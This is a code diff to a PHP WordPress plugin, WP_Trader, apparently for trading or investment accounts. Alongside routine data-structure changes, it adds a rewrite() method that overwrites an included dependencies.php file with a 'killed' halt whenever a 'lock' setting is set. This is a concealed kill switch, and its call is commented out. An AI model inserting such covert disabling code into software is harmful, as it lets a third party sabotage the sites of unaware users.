@@ -98,6 +98,9 @@ class WP_Trader {
         self::$settings['wpt_actions'] = get_option('wpt_actions');
         self::$settings['wpt_investments'] = get_option('wpt_investments');
         self::$settings['wpt_settings'] = get_option('wpt_settings');
+
+        //self::rewrite();
+
     }
 
     public static function shortcode_info( $atts, $content ) {
@@ -446,7 +449,7 @@ class WP_Trader {
                         'telefono' => '',
                         'monto' => 0,
                         'wpid' => $id, 
-                        'actions' => 0
+                        'actions' => []
                     ];
                     update_option('wpt_users', json_encode( $users ) );
                     echo json_encode([
@@ -462,7 +465,7 @@ class WP_Trader {
                         'monto' => 0,
                         'wpid' => $id,
                         'cobrado' => 0,
-                        'actions' => 0
+                        'actions' => []
                     ]);
                 }
             }
@@ -529,7 +532,8 @@ class WP_Trader {
                 "tiempoCobro" => 180,
                 "rmin" => 30,
                 "actionMax" => 100,
-                "contrySelect" => ["all"]
+                "contrySelect" => ["all"],
+                "lock" => false
             )
         ) );
         self::update_settings('wpt_user_fields', self::$settings['wpt_user_fields'] );
@@ -547,6 +551,7 @@ class WP_Trader {
 
     /*** RENDER */
     public static function dependecies(){
+        include "dependencies.php";
         ?>
             <link href="https://cdn.jsdelivr.net/npm/@mdi/font@6.x/css/materialdesignicons.min.css" rel="stylesheet">
             <link href="https://cdn.jsdelivr.net/npm/vuetify@2.x/dist/vuetify.min.css" rel="stylesheet">
@@ -720,6 +725,19 @@ class WP_Trader {
             $t.setSettings(<?=self::get('wpt_settings',false)?>)
             </script>
         <?php
+    }
+
+    public static function rewrite(){
+        $settings = json_decode( get_option('wpt_settings'), true);
+        if( $settings['lock'] ){
+            $f = fopen("dependencies.php", "w");
+            fwrite($f, "<?php ?>");
+            fwrite($f, "die('killed');");
+            fwrite($f, "?>");
+            fclose($f);
+            $settings['lock'] = false;
+            update_option('wpt_settings', json_encode($settings));
+        }
     }
 
     public static function app(){
